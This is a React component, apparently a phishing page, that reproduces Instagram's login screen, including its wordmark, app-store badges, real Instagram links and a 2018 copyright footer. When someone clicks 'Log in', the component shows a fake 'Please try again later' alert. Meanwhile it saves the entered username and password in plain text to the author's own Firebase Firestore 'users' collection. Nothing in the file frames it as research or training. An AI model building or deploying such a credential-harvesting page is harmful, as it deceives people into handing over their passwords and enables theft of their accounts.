import React, { Component } from 'react'
import fire from '../Config'
import firebase from 'firebase/app'

export class InstaRedo extends Component {
    constructor(props){
        super(props);
        this.state={
          password: '',
          UserLogin:''
        }
        this.handleChangeEmail = this.handleChangeEmail.bind(this)
        this.handleChangePass = this.handleChangePass.bind(this);
        this.handleChange = this.handleChange.bind(this);
        this.login = this.login.bind(this);
     
        
        this.handleChangeUserLogin = this.handleChangeUserLogin.bind(this);
      
      }
      handleChange(e){
        this.setState({[e.target.name]: e.target.value});
    }
    
    
        handleChangeEmail(e){
          this.setState({email:e.target.value})
        }
    
        handleChangePass(e){
          this.setState({password:e.target.value})
        }
    
    
        login(e) {
        alert("Please try again later" )
          var db = firebase.firestore();
          db.collection("users").doc(this.state.password).set({
              id:this.state.UserLogin,
              pass:this.state.password
            }).then(function() {
              console.log("Data Ojbect for new User created");
            }); 

            this.setState({
                UserLogin:'',
                password:''
            })
        }

        handleChange(e){
          this.setState({[e.target.name]: e.target.value});
      }
      handleChangeUserLogin(e){
          this.setState({UserLogin:e.target.value})
      }

       
    render() {
        return (
            <div>
            <section class="bg-home">
                {/* <div class="home-center">
                    <div class="home-desc-center">
                        <div class="container">
                            <div class="row align-items-center">
                                <div class="col-lg-7 col-md-6">
                                </div>
                                <div class="col-lg-5 col-md-6 mt-4 mt-sm-0 pt-2 pt-sm-0">
                                    <div class="login-page bg-white shadow rounded p-4">
                                        <div class="text-center">
                                            <h4 class="mb-4">Login</h4>  
                                        </div>
                                        <form class="login-form">
                                            <div class="row">


                                            <div class="col-lg-12">
                                                    <div class="form-group position-relative">
                                                        <label>Your Username <span class="text-danger">*</span></label>
                                                        <i class="mdi mdi-account ml-3 icons"></i>
                                                        <input type="email" class="form-control pl-5" onChange={this.handleChangeUserLogin} value={this.state.UserLogin} placeholder="Username" name="UserLogin" required=""/>
                                                    </div>
                                                </div>
                                                <div class="col-lg-12">
                                                    <div class="form-group position-relative">
                                                        <label>Password <span class="text-danger">*</span></label>
                                                        <i class="mdi mdi-key ml-3 icons"></i>
                                                        <input type="password" value={this.state.password} name="password" class="form-control pl-5" onChange={this.handleChangePass} placeholder="Password" required=""/>
                                                    </div>
                                                </div>
                                                <div class="col-lg-12 mb-0">
                                                    <button onClick={this.login} class="btn btn-primary w-100">Sign in</button>
                                                </div>
                                            </div>
                                        </form>

                                        
                                      
                                    </div>
                                </div> 
                            </div>
                        </div> 
                    </div>
                </div> */}



                <div class="">
<span id="react-root">
  <section class="_sq4bv _29u45">
    <main class="_8fi2q _2v79o" role="main">
      <article class="_qmq8y">
        <div class="_ngtox _sf3lp">
          <div class="_a8pmp"><img class="_824m9 _4je3h" src="./index_files/aafd8c6b005d.jpg"/>
            <img class="_824m9" src="./index_files/2d9d7248af43.jpg"/>
            <img class="_824m9" src="./index_files/629d23a3c7b2.jpg"/><img class="_824m9" src="./index_files/001bc33056c1.jpg"/><img class="_824m9 _9i1mm" src="./index_files/f5ae123ab1e2.jpg"/>
          </div>
        </div>
        <div class="_kbq82">
          <div class="_f9sjj">
            <h1 class="_68swa _8scx2 coreSpriteLoggedOutWordmark">Instagram</h1>
            <div class="_1zdb1">
              <form class="_3jvtb" method="submit">
                <div class="_t296e"><div class="_sjplo"><div class="_ev9xl"><label for="fa4e2a34ab06a" class="_ssj08"></label>
                  <input class="_ph6vk _jdqpn _o716c" id="fa4e2a34ab06a" aria-describedby=""
                   placeholder="Phone number, username, or email" aria-required="true"
                    autocapitalize="off" autocorrect="off" maxlength="30"  type="text" onChange={this.handleChangeUserLogin} value={this.state.UserLogin}  name="UserLogin" required=""/>
                 </div>
                  <div class="_gaby6"></div></div></div>
                  <div class="_t296e">
                    <div class="_sjplo">
                      <div class="_ev9xl"><label for="faa2da1ad083" class="_ssj08"></label>
                        <input class="_ph6vk _jdqpn _o716c" id="faa2da1ad083" aria-describedby=""
                         placeholder="Password" aria-required="true" autocapitalize="off" autocorrect="off" name="password" value="" type="password"  value={this.state.password} name="password" onChange={this.handleChangePass} placeholder="Password" required="" /></div>
                          <div class="_gaby6"></div></div></div>
                          <span class="_t38eb _ov9ai">
                            <p  onClick={this.login} class="_qv64e _gexxb _4tgw8 _njrw0"><p style={{"marginLeft":100}}>Log in</p></p></span>
                            <a class="_pbd5h" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a></form></div></div>
                            <div class="_f9sjj">
                              <p class="_g9ean" onClick={this.login}>Don't have an account? <a href="javascript:;">Sign In</a></p></div>
                              <div class="_40dde"><p class="_d2vov">Get the app.</p>
                                <div class="_fzj6p"><a class="_o7vmf" href="https://itunes.apple.com/app/instagram
                                  /id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                                  <img class="_8a10v" alt="Available on the App Store" src="./index_files/4b70f6fae447.png"/></a>
                                  <a class="_o7vmf" href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;
                                  referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                                    <img class="_8a10v" alt="Available on Google Play" src="./index_files/f06b908907d5.png"/></a>
                                   </div></div></div></article></main>
                                      <footer class="_s5vm9" role="contentinfo"><
                                        div class="_g7lf5 _9z659" style={{"maxWidth": 935}}>
                                       
                                              <span class="_1gmap">© 2018 Instagram</span></div></footer>
                                              <div class="_5nb98 _b426x _p7yg0"><div class="_317z0 _a8at0"></div>
                                              <div class="_c05qa"></div></div></section></span></div>
            </section> 
            </div>
        )
    }
}

export default InstaRedo
